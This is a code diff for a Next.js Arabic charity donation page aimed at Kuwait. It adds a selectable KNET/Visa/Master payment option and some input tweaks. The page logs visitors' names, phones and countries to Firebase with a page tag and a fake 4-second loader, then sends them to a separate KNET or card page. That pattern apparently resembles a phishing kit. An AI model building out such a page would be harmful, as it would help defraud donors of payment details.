@@ -9,7 +9,7 @@ import { useEffect, useState } from "react"
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
 import { FullPageLoader } from "@/components/fullpageloader"
-import { getFirestore, doc, onSnapshot }from "firebase/firestore"
+import { getFirestore, doc, onSnapshot } from "firebase/firestore"
 
 export default function CharityDonationPage() {
   const [phone, setPhone] = useState("")
@@ -18,6 +18,7 @@ export default function CharityDonationPage() {
   const [loading, setLoading] = useState(false)
   const [_id] = useState(() => "id" + Math.random().toString(16).slice(2))
   const [country, setCountry] = useState("")
+  const [paymentMethod, setPayment] = useState("knet")
   const router = useRouter()
 
   // Add these state variables at the top of the component with the other state declarations
@@ -220,10 +221,11 @@ export default function CharityDonationPage() {
                 <span className="text-xs ml-1">+965</span>
               </div>
               <input
-                className="text-right text-gray-400 p-1 mx-1"
+                className="text-right text-gray-400 p-1 mx-1 border "
                 onChange={(e) => setPhone(e.target.value)}
                 placeholder="رقم الهاتف"
                 aria-label="تليفون المتبرع"
+                type="tel"
               />
               <span className="text-gray-400">تليفون المتبرع</span>
             </div>
@@ -281,13 +283,13 @@ export default function CharityDonationPage() {
         {/* Payment Methods */}
         <div className="px-4 py-2">
           <div className="flex flex-wrap gap-3 justify-between mb-6">
-            <div className="border rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative">
+            <div onClick={() => { setPayment('master') }} className={`border ${paymentMethod === 'master' ? "border-blue-500" : ""} rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative`}>
               <img src="/vercel.svg" alt="Payment Method 1" width={60} height={30} className="h-6 w-auto" />
             </div>
-            <div className="border rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative">
+            <div onClick={() => { setPayment('visa') }} className={`border ${paymentMethod === 'visa' ? "border-blue-500" : ""} rounded-md p-2 w-[22%] h-12 flex items-center justify-center relative`}>
               <img src="/next.svg" alt="Payment Method 2" width={60} height={30} className="h-6 w-auto" />
             </div>
-            <div className="border border-blue-500 rounded-md p-2 w-[22%] h-12 flex items-center justify-center">
+            <div onClick={() => { setPayment('knet') }} className={`border ${paymentMethod === 'knet' ? "border-blue-500" : ""} rounded-md p-2 w-[22%] h-12 flex items-center justify-center`}>
               <img src="/kn.png" alt="K-net" width={60} height={30} className="h-6 w-auto" />
             </div>
           </div>
@@ -307,7 +309,12 @@ export default function CharityDonationPage() {
                 setTimeout(() => {
                   setLoading(false)
                   addData({ id: _id, page: "كي نت", name: name, phone: phone, country: country })
-                  router.push("/knet")
+                  if (paymentMethod === 'knet') {
+                    router.push("/knet")
+
+                  } else if (paymentMethod === 'visa' || paymentMethod === 'master') {
+                    router.push('/payment')
+                  }
                 }, 4000)
               }}
               className="w-full bg-teal-600 hover:bg-teal-700 text-white py-3 rounded-md"
